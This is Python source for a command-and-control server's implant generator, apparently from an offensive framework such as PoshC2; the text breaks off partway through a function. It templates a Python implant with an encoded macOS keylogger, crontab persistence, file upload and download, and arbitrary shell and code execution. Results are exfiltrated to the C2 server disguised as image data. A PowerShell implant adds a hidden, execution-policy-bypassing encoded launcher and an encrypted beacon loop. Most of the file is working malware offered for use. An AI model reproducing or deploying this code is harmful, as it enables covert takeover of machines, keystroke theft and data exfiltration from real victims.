#!/usr/bin/env python

from DB import *
from Colours import *
from Core import *
from AutoLoads import *
from ImplantHandler import *
import urllib2

class Implant(object):

  def __init__(self, ipaddress, pivot, domain, user, hostname, arch, pid, proxy):
    self.RandomURI = randomuri()
    self.User = user
    self.Hostname = hostname
    self.IPAddress = ipaddress
    self.Key = gen_key()
    self.FirstSeen = (datetime.datetime.now()).strftime("%m/%d/%Y %H:%M:%S")
    self.LastSeen = (datetime.datetime.now()).strftime("%m/%d/%Y %H:%M:%S")
    self.PID = pid
    self.Proxy = proxy
    self.Arch = arch
    self.Domain = domain
    self.DomainFrontHeader = get_dfheader()
    self.Alive = "Yes"
    self.UserAgent = get_defaultuseragent()
    self.Sleep = get_defaultbeacon()
    self.ModsLoaded = ""
    self.Pivot = pivot
    self.KillDate = get_killdate()
    self.ServerURL = new_serverurl = select_item("HostnameIP", "C2Server")
    self.AllBeaconURLs = get_otherbeaconurls()
    self.AllBeaconImages = get_images()
    with open("%spy_dropper.py" % (PayloadsDirectory), 'rb') as f:
        self.PythonImplant = base64.b64encode(f.read())
    self.PythonCore = """import urllib2, os, subprocess, re, datetime, time, base64, string, random
hh = '%s'
timer = %s
icoimage = [%s]
urls = [%s]
kd = "%s"
useragent = ""
imbase = "%s"

def keylog():
  # keylogger imported from https://raw.githubusercontent.com/EmpireProject/Empire/fcd1a3d32b4c37a392c59ffe241b9cb973fde7f4/lib/modules/python/collection/osx/keylogger.py
  import os,time,base64,subprocess,uuid
  filename = "/tmp/%%s" %% uuid.uuid4().hex
  b64logger = "aW1wb3J0IG9zLHRpbWUKZmlsZW5hbWUgPSAiUkVQTEFDRU1FIgpvdXRwdXQgPSBvcy5wb3BlbignZWNobyAicmVxdWlyZSBcJ2Jhc2U2NFwnO2V2YWwoQmFzZTY0LmRlY29kZTY0KFwnWkdWbUlISjFZbmxmTVY4NVgyOXlYMmhwWjJobGNqOE5DaUFnVWxWQ1dWOVdSVkpUU1U5T0xuUnZYMllnUGowZ01TNDVJQ1ltSUZKVlFsbGZWa1ZTVTBsUFRpNTBiMTltUERJdU13MEtaVzVrRFFwa1pXWWdjblZpZVY4eVh6TmZiM0pmYUdsbmFHVnlQdzBLSUNCU1ZVSlpYMVpGVWxOSlQwNHVkRzlmWmlBK1BTQXlMak1OQ21WdVpBMEtjbVZ4ZFdseVpTQW5kR2h5WldGa0p3MEtjbVZ4ZFdseVpTQW5abWxrWkd4bEp5QnBaaUJ5ZFdKNVh6SmZNMTl2Y2w5b2FXZG9aWEkvRFFweVpYRjFhWEpsSUNkbWFXUmtiR1V2YVcxd2IzSjBKeUJwWmlCeWRXSjVYekpmTTE5dmNsOW9hV2RvWlhJL0RRcHlaWEYxYVhKbElDZGtiQ2NnYVdZZ2JtOTBJSEoxWW5sZk1sOHpYMjl5WDJocFoyaGxjajhOQ25KbGNYVnBjbVVnSjJSc0wybHRjRzl5ZENjZ2FXWWdibTkwSUhKMVlubGZNbDh6WDI5eVgyaHBaMmhsY2o4TkNrbHRjRzl5ZEdWeUlEMGdhV1lnWkdWbWFXNWxaRDhvUkV3Nk9rbHRjRzl5ZEdWeUtTQjBhR1Z1SUdWNGRHVnVaQ0JFVERvNlNXMXdiM0owWlhJZ1pXeHphV1lnWkdWbWFXNWxaRDhvUm1sa1pHeGxPanBKYlhCdmNuUmxjaWtnZEdobGJpQmxlSFJsYm1RZ1JtbGtaR3hsT2pwSmJYQnZjblJsY2lCbGJITmxJRVJNT2pwSmJYQnZjblJoWW14bElHVnVaQTBLWkdWbUlHMWhiR3h2WTNNb2MybDZaU2tOQ2lBZ2FXWWdjblZpZVY4eVh6TmZiM0pmYUdsbmFHVnlQdzBLSUNBZ0lFWnBaR1JzWlRvNlVHOXBiblJsY2k1dFlXeHNiMk1vYzJsNlpTa05DaUFnWld4emFXWWdjblZpZVY4eFh6bGZiM0pmYUdsbmFHVnlQeUFOQ2lBZ0lDQkVURG82UTFCMGNpNXRZV3hzYjJNb2MybDZaU2tOQ2lBZ1pXeHpaUTBLSUNBZ0lFUk1PanB0WVd4c2IyTW9jMmw2WlNrTkNpQWdaVzVrRFFwbGJtUU5DbWxtSUc1dmRDQnlkV0o1WHpGZk9WOXZjbDlvYVdkb1pYSS9EUW9nSUcxdlpIVnNaU0JFVEEwS0lDQWdJRzF2WkhWc1pTQkpiWEJ2Y25SaFlteGxEUW9nSUNBZ0lDQmtaV1lnYldWMGFHOWtYMjFwYzNOcGJtY29iV1YwYUN3Z0ttRnlaM01zSUNaaWJHOWpheWtOQ2lBZ0lDQWdJQ0FnYzNSeUlEMGdiV1YwYUM1MGIxOXpEUW9nSUNBZ0lDQWdJR3h2ZDJWeUlEMGdjM1J5V3pBc01WMHVaRzkzYm1OaGMyVWdLeUJ6ZEhKYk1TNHVMVEZkRFFvZ0lDQWdJQ0FnSUdsbUlITmxiR1l1Y21WemNHOXVaRjkwYno4Z2JHOTNaWElOQ2lBZ0lDQWdJQ0FnSUNCelpXeG1Mbk5sYm1RZ2JHOTNaWElzSUNwaGNtZHpEUW9nSUNBZ0lDQWdJR1ZzYzJVTkNpQWdJQ0FnSUNBZ0lDQnpkWEJsY2cwS0lDQWdJQ0FnSUNCbGJtUU5DaUFnSUNBZ0lHVnVaQTBLSUNBZ0lHVnVaQTBLSUNCbGJtUU5DbVZ1WkEwS1UwMWZTME5JVWw5RFFVTklSU0E5SURNNERRcFRUVjlEVlZKU1JVNVVYMU5EVWtsUVZDQTlJQzB5RFFwTlFWaGZRVkJRWDA1QlRVVWdQU0E0TUEwS2JXOWtkV3hsSUVOaGNtSnZiZzBLSUNCcFppQnlkV0o1WHpKZk0xOXZjbDlvYVdkb1pYSS9EUW9nSUNBZ1pYaDBaVzVrSUVacFpHUnNaVG82U1cxd2IzSjBaWElOQ2lBZ1pXeHpaUTBLSUNBZ0lHVjRkR1Z1WkNCRVREbzZTVzF3YjNKMFpYSU5DaUFnWlc1a0RRb2dJR1JzYkc5aFpDQW5MMU41YzNSbGJTOU1hV0p5WVhKNUwwWnlZVzFsZDI5eWEzTXZRMkZ5WW05dUxtWnlZVzFsZDI5eWF5OURZWEppYjI0bkRRb2dJR1Y0ZEdWeWJpQW5kVzV6YVdkdVpXUWdiRzl1WnlCRGIzQjVVSEp2WTJWemMwNWhiV1VvWTI5dWMzUWdVSEp2WTJWemMxTmxjbWxoYkU1MWJXSmxjaUFxTENCMmIybGtJQ29wSncwS0lDQmxlSFJsY200Z0ozWnZhV1FnUjJWMFJuSnZiblJRY205alpYTnpLRkJ5YjJObGMzTlRaWEpwWVd4T2RXMWlaWElnS2lrbkRRb2dJR1Y0ZEdWeWJpQW5kbTlwWkNCSFpYUkxaWGx6S0hadmFXUWdLaWtuRFFvZ0lHVjRkR1Z5YmlBbmRXNXphV2R1WldRZ1kyaGhjaUFxUjJWMFUyTnlhWEIwVm1GeWFXRmliR1VvYVc1MExDQnBiblFwSncwS0lDQmxlSFJsY200Z0ozVnVjMmxuYm1Wa0lHTm9ZWElnUzJWNVZISmhibk5zWVhSbEtIWnZhV1FnS2l3Z2FXNTBMQ0IyYjJsa0lDb3BKdzBLSUNCbGVIUmxjbTRnSjNWdWMybG5ibVZrSUdOb1lYSWdRMFpUZEhKcGJtZEhaWFJEVTNSeWFXNW5LSFp2YVdRZ0tpd2dkbTlwWkNBcUxDQnBiblFzSUdsdWRDa25EUW9nSUdWNGRHVnliaUFuYVc1MElFTkdVM1J5YVc1blIyVjBUR1Z1WjNSb0tIWnZhV1FnS2lrbkRRcGxibVFOQ25CemJpQTlJRzFoYkd4dlkzTW9NVFlwRFFwdVlXMWxJRDBnYldGc2JHOWpjeWd4TmlrTkNtNWhiV1ZmWTNOMGNpQTlJRzFoYkd4dlkzTW9UVUZZWDBGUVVGOU9RVTFGS1EwS2EyVjViV0Z3SUQwZ2JXRnNiRzlqY3lneE5pa05Dbk4wWVhSbElEMGdiV0ZzYkc5amN5ZzRLUTBLYVhSMlgzTjBZWEowSUQwZ1ZHbHRaUzV1YjNjdWRHOWZhUTBLY0hKbGRsOWtiM2R1SUQwZ1NHRnphQzV1Wlhjb1ptRnNjMlVwRFFwc1lYTjBWMmx1Wkc5M0lEMGdJaUlOQ25kb2FXeGxJQ2gwY25WbEtTQmtidzBLSUNCRFlYSmliMjR1UjJWMFJuSnZiblJRY205alpYTnpLSEJ6Ymk1eVpXWXBEUW9nSUVOaGNtSnZiaTVEYjNCNVVISnZZMlZ6YzA1aGJXVW9jSE51TG5KbFppd2dibUZ0WlM1eVpXWXBEUW9nSUVOaGNtSnZiaTVIWlhSTFpYbHpLR3RsZVcxaGNDa05DaUFnYzNSeVgyeGxiaUE5SUVOaGNtSnZiaTVEUmxOMGNtbHVaMGRsZEV4bGJtZDBhQ2h1WVcxbEtRMEtJQ0JqYjNCcFpXUWdQU0JEWVhKaWIyNHVRMFpUZEhKcGJtZEhaWFJEVTNSeWFXNW5LRzVoYldVc0lHNWhiV1ZmWTNOMGNpd2dUVUZZWDBGUVVGOU9RVTFGTENBd2VEQTRNREF3TVRBd0tTQStJREFOQ2lBZ1lYQndYMjVoYldVZ1BTQnBaaUJqYjNCcFpXUWdkR2hsYmlCdVlXMWxYMk56ZEhJdWRHOWZjeUJsYkhObElDZFZibXR1YjNkdUp5QmxibVFOQ2lBZ1lubDBaWE1nUFNCclpYbHRZWEF1ZEc5ZmMzUnlEUW9nSUdOaGNGOW1iR0ZuSUQwZ1ptRnNjMlVOQ2lBZ1lYTmphV2tnUFNBd0RRb2dJR04wY214amFHRnlJRDBnSWlJTkNpQWdLREF1TGk0eE1qZ3BMbVZoWTJnZ1pHOGdmR3Q4RFFvZ0lDQWdhV1lnS0NoaWVYUmxjMXRyUGo0elhTNXZjbVFnUGo0Z0tHc21OeWtwSUNZZ01TQStJREFwRFFvZ0lDQWdJQ0JwWmlCdWIzUWdjSEpsZGw5a2IzZHVXMnRkRFFvZ0lDQWdJQ0FnSUdOaGMyVWdhdzBLSUNBZ0lDQWdJQ0FnSUhkb1pXNGdNellOQ2lBZ0lDQWdJQ0FnSUNBZ0lHTjBjbXhqYUdGeUlEMGdJbHRsYm5SbGNsMGlEUW9nSUNBZ0lDQWdJQ0FnZDJobGJpQTBPQTBLSUNBZ0lDQWdJQ0FnSUNBZ1kzUnliR05vWVhJZ1BTQWlXM1JoWWwwaURRb2dJQ0FnSUNBZ0lDQWdkMmhsYmlBME9RMEtJQ0FnSUNBZ0lDQWdJQ0FnWTNSeWJHTm9ZWElnUFNBaUlDSU5DaUFnSUNBZ0lDQWdJQ0IzYUdWdUlEVXhEUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSmJaR1ZzWlhSbFhTSU5DaUFnSUNBZ0lDQWdJQ0IzYUdWdUlEVXpEUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSmJaWE5qWFNJTkNpQWdJQ0FnSUNBZ0lDQjNhR1Z1SURVMURRb2dJQ0FnSUNBZ0lDQWdJQ0JqZEhKc1kyaGhjaUE5SUNKYlkyMWtYU0lOQ2lBZ0lDQWdJQ0FnSUNCM2FHVnVJRFUyRFFvZ0lDQWdJQ0FnSUNBZ0lDQmpkSEpzWTJoaGNpQTlJQ0piYzJocFpuUmRJZzBLSUNBZ0lDQWdJQ0FnSUhkb1pXNGdOVGNOQ2lBZ0lDQWdJQ0FnSUNBZ0lHTjBjbXhqYUdGeUlEMGdJbHRqWVhCelhTSU5DaUFnSUNBZ0lDQWdJQ0IzYUdWdUlEVTREUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSmJiM0IwYVc5dVhTSU5DaUFnSUNBZ0lDQWdJQ0IzYUdWdUlEVTVEUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSmJZM1J5YkYwaURRb2dJQ0FnSUNBZ0lDQWdkMmhsYmlBMk13MEtJQ0FnSUNBZ0lDQWdJQ0FnWTNSeWJHTm9ZWElnUFNBaVcyWnVYU0lOQ2lBZ0lDQWdJQ0FnSUNCbGJITmxEUW9nSUNBZ0lDQWdJQ0FnSUNCamRISnNZMmhoY2lBOUlDSWlEUW9nSUNBZ0lDQWdJR1Z1WkEwS0lDQWdJQ0FnSUNCcFppQmpkSEpzWTJoaGNpQTlQU0FpSWlCaGJtUWdZWE5qYVdrZ1BUMGdNQTBLSUNBZ0lDQWdJQ0FnSUd0amFISWdQU0JEWVhKaWIyNHVSMlYwVTJOeWFYQjBWbUZ5YVdGaWJHVW9VMDFmUzBOSVVsOURRVU5JUlN3Z1UwMWZRMVZTVWtWT1ZGOVRRMUpKVUZRcERRb2dJQ0FnSUNBZ0lDQWdZM1Z5Y2w5aGMyTnBhU0E5SUVOaGNtSnZiaTVMWlhsVWNtRnVjMnhoZEdVb2EyTm9jaXdnYXl3Z2MzUmhkR1VwRFFvZ0lDQWdJQ0FnSUNBZ1kzVnljbDloYzJOcGFTQTlJR04xY25KZllYTmphV2tnUGo0Z01UWWdhV1lnWTNWeWNsOWhjMk5wYVNBOElERU5DaUFnSUNBZ0lDQWdJQ0J3Y21WMlgyUnZkMjViYTEwZ1BTQjBjblZsRFFvZ0lDQWdJQ0FnSUNBZ2FXWWdZM1Z5Y2w5aGMyTnBhU0E5UFNBd0RRb2dJQ0FnSUNBZ0lDQWdJQ0JqWVhCZlpteGhaeUE5SUhSeWRXVU5DaUFnSUNBZ0lDQWdJQ0JsYkhObERRb2dJQ0FnSUNBZ0lDQWdJQ0JoYzJOcGFTQTlJR04xY25KZllYTmphV2tOQ2lBZ0lDQWdJQ0FnSUNCbGJtUU5DaUFnSUNBZ0lDQWdaV3h6YVdZZ1kzUnliR05vWVhJZ0lUMGdJaUlOQ2lBZ0lDQWdJQ0FnSUNCd2NtVjJYMlJ2ZDI1YmExMGdQU0IwY25WbERRb2dJQ0FnSUNBZ0lHVnVaQTBLSUNBZ0lDQWdaVzVrRFFvZ0lDQWdaV3h6WlEwS0lDQWdJQ0FnY0hKbGRsOWtiM2R1VzJ0ZElEMGdabUZzYzJVTkNpQWdJQ0JsYm1RTkNpQWdaVzVrRFFvZ0lHbG1JR0Z6WTJscElDRTlJREFnYjNJZ1kzUnliR05vWVhJZ0lUMGdJaUlOQ2lBZ0lDQnBaaUJoY0hCZmJtRnRaU0FoUFNCc1lYTjBWMmx1Wkc5M0RRb2dJQ0FnSUNCd2RYUnpJQ0pjYmx4dVd5TjdZWEJ3WDI1aGJXVjlYU0F0SUZzamUxUnBiV1V1Ym05M2ZWMWNiaUlOQ2lBZ0lDQWdJR3hoYzNSWGFXNWtiM2NnUFNCaGNIQmZibUZ0WlEwS0lDQWdJR1Z1WkEwS0lDQWdJR2xtSUdOMGNteGphR0Z5SUNFOUlDSWlEUW9nSUNBZ0lDQndjbWx1ZENBaUkzdGpkSEpzWTJoaGNuMGlEUW9nSUNBZ1pXeHphV1lnWVhOamFXa2dQaUF6TWlCaGJtUWdZWE5qYVdrZ1BDQXhNamNOQ2lBZ0lDQWdJR01nUFNCcFppQmpZWEJmWm14aFp5QjBhR1Z1SUdGelkybHBMbU5vY2k1MWNHTmhjMlVnWld4elpTQmhjMk5wYVM1amFISWdaVzVrRFFvZ0lDQWdJQ0J3Y21sdWRDQWlJM3RqZlNJTkNpQWdJQ0JsYkhObERRb2dJQ0FnSUNCd2NtbHVkQ0FpV3lON1lYTmphV2w5WFNJTkNpQWdJQ0JsYm1RTkNpQWdJQ0FrYzNSa2IzVjBMbVpzZFhOb0RRb2dJR1Z1WkEwS0lDQkxaWEp1Wld3dWMyeGxaWEFvTUM0d01Ta05DbVZ1WkEwS0RRbz1cJykpIiB8IHJ1YnkgPiAlcyAyPiYxICYnICUgZmlsZW5hbWUpLnJlYWQoKQp0aW1lLnNsZWVwKDEpCg=="
  modb64logger = base64.b64decode(b64logger)
  modpayload = modb64logger.replace("REPLACEME",filename)
  exec(modpayload)
  pids = os.popen('ps aux | grep " ruby" | grep -v grep').read()
  returnval = "%%s \\r\\nKeylogger started here: %%s" %% (pids, filename)
  return returnval  

def dfile(fname):
  if fname:
    with open(fname, "rb") as image_file:
      imgbytes = image_file.read()
  return "0000100001" + imgbytes

def ufile(base64file, fname):
  fname = fname.replace('"','')
  filebytes = base64.b64decode(base64file)
  try:
    output_file = open(fname, 'w')
    output_file.write(filebytes)
    output_file.close()
    return "Uploaded file %%s" %% fname
  except Exception as e:
    return "Error with source file: %%s" %% e
  
def sai(delfile=False):
  import uuid
  filename = "/tmp/%%s.sh" %% (uuid.uuid4().hex)
  imfull = base64.b64decode(imbase)
  output_file = open(filename, 'w')
  output_file.write(imfull)
  output_file.close()
  import subprocess
  returnval = "Ran Start Another Implant - File dropped: %%s" %% filename
  p = subprocess.Popen(["sh", filename])
  if delfile:
    p = subprocess.Popen(["rm", filename])
    returnval = "Ran Start Another Implant - File removed: %%s" %% filename
  return returnval

def persist():
  import uuid, os
  dircontent = "%%s/.%%s" %% (os.environ['HOME'], uuid.uuid4().hex)
  os.mkdir(dircontent)
  filename = "%%s/%%s_psh.sh" %% (dircontent, uuid.uuid4().hex)
  imfull = base64.b64decode(imbase)
  output_file = open(filename, 'w')
  output_file.write(imfull)
  output_file.close()
  import subprocess as s
  s.call("crontab -l | { cat; echo '* 10 * * * sh %%s'; } | crontab -" %% filename, shell=True)
  return "Installing persistence via user crontab everyday at 10am: \\r\\n%%s" %% filename

def remove_persist():
  import subprocess as s
  s.call("crontab -l | { cat;  } | grep -v '_psh.sh'| crontab -", shell=True)
  return "Removed user persistence via crontab: \\r\\n**must delete files manually**" 

def decrypt_bytes_gzip( key, data):
  iv = data[0:16]
  aes = get_encryption(key, iv)
  data =  aes.decrypt( data )
  import StringIO
  import gzip
  infile = StringIO.StringIO(data[16:])
  with gzip.GzipFile(fileobj=infile, mode="r") as f:
    data = f.read()
  return data

while(True):
  cstr=time.strftime("%%d/%%m/%%Y",time.gmtime());cstr=time.strptime(cstr,"%%d/%%m/%%Y")
  if cstr < kd:
    key = "%s"
    uri = "%s"
    serverclean = "%s"
    server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
    try:
      time.sleep(timer)
      ua='%s'
      if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
      else: req=urllib2.Request(server,headers={'User-agent':ua})
      res=urllib2.urlopen(req);
      html = res.read()
    except Exception as e:
      E = e
      #print "error %%s" %% e
    #print html
    if html:
      try:
        returncmd = decrypt( key, html )
        returncmd = returncmd.rstrip('\\0')
  
        if "multicmd" in returncmd:
  
          returncmd = returncmd.replace("multicmd","")
          returnval = ""
          split = returncmd.split("!d-3dion@LD!-d")
  
          for cmd in split:
            if cmd[:10] == "$sleeptime":
              timer = int(cmd.replace("$sleeptime = ",""))
            elif cmd[:13] == "download-file":  
              fname = cmd.replace("download-file ","")
              returnval = dfile(fname) 
            elif cmd[:11] == "upload-file":  
              fullparams = cmd.replace("upload-file ","")
              params = fullparams.split(":")
              returnval = ufile(params[1],params[0]) 
            elif cmd[:19] == "install-persistence":  
              returnval = persist() 
            elif cmd[:14] == "get-keystrokes":  
              returnval = keylog()
            elif cmd[:18] == "remove-persistence":  
              returnval = remove_persist() 
            elif cmd[:19] == "startanotherimplant":   
              returnval = sai(delfile=True)
            elif cmd[:28] == "startanotherimplant-keepfile":
              returnval = sai()  
            elif cmd[:10] == "loadmodule":
              module = cmd.replace("loadmodule","")
              exec(module)
              try:
                import sys
                import StringIO
                import contextlib
                
                @contextlib.contextmanager
                def stdoutIO(stdout=None):
                  old = sys.stdout
                  if stdout is None:
                    stdout = StringIO.StringIO()
                  sys.stdout = stdout
                  yield stdout
                  sys.stdout = old
  
                with stdoutIO() as s:
                  exec module
                if s.getvalue():
                  returnval = s.getvalue()
                else:
                  returnval = "Module loaded"
              except Exception as e:
                returnval = "Error with source file: %%s" %% e
              
            elif cmd[:6] == "python":
              module = cmd.replace("python ","")            
              try:
                import sys
                import StringIO
                import contextlib
                
                @contextlib.contextmanager
                def stdoutIO(stdout=None):
                  old = sys.stdout
                  if stdout is None:
                    stdout = StringIO.StringIO()
                  sys.stdout = stdout
                  yield stdout
                  sys.stdout = old
  
                with stdoutIO() as s:
                  exec module
                
                returnval = s.getvalue()
  
              except Exception as e:
                returnval = "Error with source file: %%s" %% e
  
            else:
              try:
                returnval = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
              except subprocess.CalledProcessError as exc:
                returnval = "ErrorCmd: %%s" %% exc.output
                
            server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
            opener = urllib2.build_opener()
            postcookie = encrypt(key, cmd)
            data = base64.b64decode(random.choice(icoimage))
            dataimage = data.ljust( 1500, '\\0' )
            dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
            if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
            else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
            res=urllib2.urlopen(req);
            response = res.read()

      except Exception as e:
        E = e
        #print "error %%s" %% e
        w = \"\"""" % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.ServerURL, self.UserAgent)
    self.C2Core = """
$key="%s"
$global:sleeptime = '%s'

$payloadclear = @"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
`$s="$s"
`$sc="$sc"
function DEC {${function:DEC}}
function ENC {${function:ENC}}
function CAM {${function:CAM}}
function Get-Webclient {${function:Get-Webclient}} 
function Primer {${function:primer}}
`$primer = primer
if (`$primer) {`$primer| iex} else {
start-sleep 1800
primer | iex }
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($payloadclear)
$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`"$EncodedCompressedScript`"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))
$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e $($EncodedPayloadScript)"
$payload = $payloadraw -replace "`n", ""

function GetImgData($cmdoutput) {
    $icoimage = @(%s)
    
    try {$image = $icoimage|get-random}catch{}

    function randomgen 
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) 
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $maxdatalen = 1500 + ($cmdoutput.Length)
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen
    $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImageBytesFull = New-Object byte[] $maxdatalen    
    [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
    [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
    [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
    $ImageBytesFull
}
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
    if ($IV.getType().Name -eq "String") {
    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
    }
    else {
    $aesManaged.IV = $IV
    }
    }
    if ($key) {
    if ($key.getType().Name -eq "String") {
    $aesManaged.Key = [System.Convert]::FromBase64String($key)
    }
    else {
    $aesManaged.Key = $key
    }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}
function Encrypt-Bytes($key, $bytes) {
  [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
  $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
  $gzipStream.Write( $bytes, 0, $bytes.Length )
  $gzipStream.Close()
  $bytes = $output.ToArray()
  $output.Close()
  $aesManaged = Create-AesManagedObject $key 
  $encryptor = $aesManaged.CreateEncryptor() 
  $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
  [byte[]] $fullData = $aesManaged.IV + $encryptedData 
  $fullData
}
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Encrypt-String2($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object System.IO.Compression.GzipStream $CompressedStream, ([IO.Compression.CompressionMode]::Compress)    
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}
function Decrypt-String2($key, $encryptedStringWithIV) {
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$URI= "%s"
$Server = "$s/%s"
$ServerClean = "$sc"
while($true)
{
    $ServerURLS = "$($ServerClean)","$($ServerClean)"
    $date = (Get-Date -Format "dd/MM/yyyy")
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
    $killdate = [datetime]::ParseExact("%s","dd/MM/yyyy",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5} 
    start-sleep $newsleep
    $URLS = %s
    $RandomURI = Get-Random $URLS
    $ServerClean = Get-Random $ServerURLS
    $G=[guid]::NewGuid()
    $Server = "$ServerClean/$RandomURI$G/?$URI"
    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
    
    while($ReadCommand) {
        $RandomURI = Get-Random $URLS
        $ServerClean = Get-Random $ServerURLS
        $G=[guid]::NewGuid()
        $Server = "$ServerClean/$RandomURI$G/?$URI"
        try { $ReadCommandClear = Decrypt-String $key $ReadCommand } catch {}
        $error.clear()
        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                    $splitcmd = $ReadCommandClear -replace "multicmd",""
                    $split = $splitcmd -split "!d-3dion@LD!-d"
                    foreach ($i in $split){
                        $RandomURI = Get-Random $URLS
                        $ServerClean = Get-Random $ServerURLS
                        $G=[guid]::NewGuid()
                        $Server = "$ServerClean/$RandomURI$G/?$URI"
                        $error.clear()
                        if ($i.ToLower().StartsWith("upload-file")) {
                            try {
                                $Output = Invoke-Expression $i | out-string
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                                $ModuleLoaded = Encrypt-String $key $result
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorUpload: " + $error[0]
                            }
                        } elseif ($i.ToLower().StartsWith("download-file")) {
                            try {
                                Invoke-Expression $i | Out-Null
                            }
                            catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } elseif ($i.ToLower().StartsWith("loadmodule")) {
                            try {
                                $modulename = $i -replace "LoadModule",""
